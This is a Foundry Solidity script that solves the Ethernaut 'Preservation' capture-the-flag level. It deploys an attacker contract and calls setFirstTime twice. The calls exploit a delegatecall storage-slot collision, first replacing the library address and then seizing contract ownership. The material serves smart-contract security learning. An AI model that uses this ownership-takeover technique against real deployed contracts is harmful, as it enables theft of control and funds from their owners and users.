// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { IPreservation } from "ethernaut/16-preservation/IPreservation.sol";
import { PreservationAttacker } from "ethernaut/16-preservation/PreservationAttacker.sol";

contract PreservationScript is Script {
    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address preservationAddr = vm.envAddress("L16_PRESERVATION_ADDRESS");
        IPreservation preservation = IPreservation(preservationAddr);

        // Step 1: deploy `PreservationAttacker` to replace both timeZone libraries
        PreservationAttacker tzLibraryMalicious = new PreservationAttacker();
        uint256 tzLibraryMaliciousAddrAsUint = uint256(uint160(address(tzLibraryMalicious)));

        // Step 2: overwrite both
        preservation.setFirstTime(tzLibraryMaliciousAddrAsUint);

        // Step 3: overwrite the owner via `PreservationAttacker.setTime()`
        uint256 msgSenderAsUint = uint256(uint160(address(vm.addr(deployerPrivateKey))));
        preservation.setFirstTime(msgSenderAsUint);

        console.logAddress(preservation.owner());

        vm.stopBroadcast();
    }
}
